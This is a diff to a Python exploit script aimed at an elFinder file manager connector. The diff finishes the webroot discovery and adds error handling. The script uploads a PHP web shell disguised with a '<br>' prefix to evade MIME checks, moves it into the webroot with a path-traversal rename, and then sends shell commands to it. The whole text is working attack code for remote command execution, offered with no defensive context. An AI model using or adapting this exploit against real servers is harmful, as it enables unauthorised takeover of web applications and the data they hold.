@@ -1,12 +1,15 @@
 import argparse
 import base64
-import requests
 import json
+import re
+import requests
 
 def get_webroot(url: str):
-    # TODO: Webroot can be obtained by sending a request to /setup (if it hasn't been removed)
+    res = requests.get(url + "/setup")
 
-    pass    # TODO: Finish me
+    match = re.search(r'<code>(.*?)</code>', res.text)
+    if match:
+        return match.group(1)
 
 def get_elfinder_id(name: str, volume_id: str = "l1"):
     base_64 = base64.b64encode(name.encode("utf-8"))
@@ -21,7 +24,10 @@ def create_dir(url: str, params: dict, dirname: str, root_dir_id: str) -> str:
     params["name"] = dirname
     params["target"] = root_dir_id
 
-    requests.get(url, params = params, allow_redirects = False)
+    res = requests.get(url, params = params, allow_redirects = False)
+
+    if res.status_code != 302:
+        raise requests.exceptions.RequestException("Failed to create directory")
 
     return dir_id
 
@@ -41,12 +47,15 @@ def upload_file(
         "upload[]": (filename, payload, "text/plain")
     }
 
-    requests.post(
+    res = requests.post(
         url,
         params = params,
         data = data,
         files = files,
         allow_redirects = False)
+
+    if res.status_code != 302:
+        raise requests.exceptions.RequestException("Failed to upload file")
 
     return get_elfinder_id(filename)
 
@@ -61,11 +70,17 @@ def rename_file(
     params["target"] = file_id
     params["name"] = f"{dirname}/../../../../{shellname}"
 
-    requests.get(url, params = params, allow_redirects = False)
+    res = requests.get(url, params = params, allow_redirects = False)
+
+    if res.status_code != 302:
+        raise requests.exceptions.RequestException("Failed to rename file")
 
 def send_command(url: str, command: str):
 
     res = requests.get(url, params = { "cmd": command })
+
+    if res.status_code != 200:
+        raise requests.exceptions.RequestException("Failed to connect to web shell")
 
     print(res.text[4:])
 
@@ -88,16 +103,23 @@ def main():
 
     payload = f"<br><?php system($_GET['cmd']); ?>" # <br> is to prevent mime type detection
 
+    url = args.url.rstrip("/")
+
     if args.webroot is None:
         webroot = get_webroot(url)
+        if webroot is None:
+            print("Error: Failed to retrieve webroot from {url + '/setup'}")
+            exit
+    else:
+        webroot = args.webroot
 
-    url = args.url.rstrip("/")
+    webroot = webroot.rstrip("/")
 
     connector_url = url + "/editor/elfinder/php/connector.php"
 
     user_dir =  f"/USER-FILES/1-{args.user}-Nottingham/"
 
-    full_user_dir = args.webroot + user_dir
+    full_user_dir = webroot + user_dir
 
     upload_url = url + user_dir
 
